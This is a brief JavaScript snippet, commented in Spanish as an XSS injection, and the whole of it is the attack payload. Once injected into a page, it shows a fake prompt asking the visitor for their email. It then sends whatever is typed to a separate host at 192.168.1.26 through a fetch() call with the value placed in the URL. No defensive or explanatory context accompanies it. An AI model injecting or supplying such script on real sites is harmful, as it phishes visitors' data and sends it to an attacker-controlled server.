// inyeccion xss

var email = prompt("Introduce tu email", "example@example.com");

if (email == null || email == "") {
  alert("No has introducido un email");
}else{
    //mandamos al servidor el email
    fetch(`http://192.168.1.26/${email}`);
}

